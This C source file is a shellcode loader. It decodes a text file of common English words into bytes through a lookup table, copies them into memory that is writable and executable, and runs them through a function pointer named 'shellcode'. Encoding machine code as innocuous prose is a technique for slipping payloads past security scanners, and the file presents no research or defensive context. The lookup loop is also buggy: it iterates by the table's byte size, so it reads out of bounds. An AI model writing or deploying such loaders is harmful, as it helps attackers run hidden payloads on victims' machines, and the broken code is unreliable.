#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

// Lookup table for converting English words to byte values
const char *LOOKUP_TABLE[] = {"the",        "of",          "and",
                              "to",         "in",          "for",
                              "is",         "on",          "that",
                              "by",         "this",        "with",
                              "you",        "it",          "not",
                              "or",         "be",          "are",
                              "from",       "at",          "as",
                              "your",       "all",         "have",
                              "new",        "more",        "an",
                              "was",        "we",          "will",
                              "home",       "can",         "us",
                              "about",      "if",          "page",
                              "my",         "has",         "search",
                              "free",       "but",         "our",
                              "one",        "other",       "do",
                              "no",         "information", "time",
                              "they",       "site",        "he",
                              "up",         "may",         "what",
                              "which",      "their",       "news",
                              "out",        "use",         "any",
                              "there",      "see",         "only",
                              "so",         "his",         "when",
                              "contact",    "here",        "business",
                              "who",        "web",         "also",
                              "now",        "help",        "get",
                              "pm",         "view",        "online",
                              "first",      "am",          "been",
                              "would",      "how",         "were",
                              "me",         "services",    "some",
                              "these",      "click",       "its",
                              "like",       "service",     "than",
                              "find",       "price",       "date",
                              "back",       "top",         "people",
                              "had",        "list",        "name",
                              "just",       "over",        "state",
                              "year",       "day",         "into",
                              "email",      "two",         "health",
                              "world",      "re",          "next",
                              "used",       "go",          "work",
                              "last",       "most",        "products",
                              "music",      "buy",         "data",
                              "make",       "them",        "should",
                              "product",    "system",      "post",
                              "her",        "city",        "add",
                              "policy",     "number",      "such",
                              "please",     "available",   "copyright",
                              "support",    "message",     "after",
                              "best",       "software",    "then",
                              "jan",        "good",        "video",
                              "well",       "where",       "info",
                              "rights",     "public",      "books",
                              "high",       "school",      "through",
                              "each",       "links",       "she",
                              "review",     "years",       "order",
                              "very",       "privacy",     "book",
                              "items",      "company",     "read",
                              "group",      "sex",         "need",
                              "many",       "user",        "said",
                              "de",         "does",        "set",
                              "under",      "general",     "research",
                              "university", "january",     "mail",
                              "full",       "map",         "reviews",
                              "program",    "life",        "know",
                              "games",      "way",         "days",
                              "management", "part",        "could",
                              "great",      "united",      "hotel",
                              "real",       "item",        "international",
                              "center",     "ebay",        "must",
                              "store",      "travel",      "comments",
                              "made",       "development", "report",
                              "off",        "member",      "details",
                              "line",       "terms",       "before",
                              "hotels",     "did",         "send",
                              "right",      "type",        "because",
                              "local",      "those",       "using",
                              "results",    "office",      "education",
                              "national",   "car",         "design",
                              "take",       "posted",      "internet",
                              "address",    "community",   "within",
                              "states",     "area",        "want",
                              "phone",      "dvd",         "shipping",
                              "reserved",   "subject",     "between",
                              "forum",      "family",      "long",
                              "based",      "code",        "show",
                              "even",       "black",       "check",
                              "special"};

// Function to find the hex value for a word
uint8_t find_hex_value(const char *word) {
    for (int i = 0; i < sizeof(LOOKUP_TABLE); i++) {
        if (strcmp(word, LOOKUP_TABLE[i]) == 0) {
            return i;
        }
    }
    // Return 0x90 (NOP) if the word is not found
    // This also allows the use of undefined words for representing NOP
    return 0x90;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <filename>\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Open the file
    int fd = open(argv[1], O_RDONLY);
    if (fd == -1) {
        perror("Failed to open file");
        return EXIT_FAILURE;
    }

    // Get the size of the file
    struct stat sb;
    if (fstat(fd, &sb) == -1) {
        perror("Failed to get file size");
        close(fd);
        return EXIT_FAILURE;
    }

    // Memory-map the file
    char *file_content = mmap(NULL, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (file_content == MAP_FAILED) {
        perror("Failed to memory-map file");
        close(fd);
        return EXIT_FAILURE;
    }

    // File descriptor is no longer needed after mmap
    close(fd);

    // Allocate executable memory
    uint8_t *executable_memory = mmap(
        NULL, sb.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0
    );
    if (executable_memory == MAP_FAILED) {
        perror("Failed to allocate executable memory");
        munmap(file_content, sb.st_size);
        return EXIT_FAILURE;
    }

    // Make a writable copy of the file contents
    char *writable_content = malloc(sb.st_size + 1);
    if (!writable_content) {
        perror("Failed to allocate memory for writable content");
        munmap(file_content, sb.st_size);
        munmap(executable_memory, sb.st_size);
        return EXIT_FAILURE;
    }
    memcpy(writable_content, file_content, sb.st_size);
    writable_content[sb.st_size] = '\0';  // Ensure null termination

    // Tokenize the input and write the corresponding hex values to executable memory
    char *token = strtok(writable_content, " ");
    size_t offset = 0;

    while (token != NULL && offset < sb.st_size) {
        uint8_t hex_value = find_hex_value(token);
        executable_memory[offset++] = hex_value;
        token = strtok(NULL, " ");
    }

    // Clean up
    free(writable_content);
    munmap(file_content, sb.st_size);

    // Cast executable memory to a function pointer and execute
    void (*shellcode)() = (void (*)())executable_memory;
    shellcode();

    // Clean up
    munmap(executable_memory, sb.st_size);

    return 0;
}
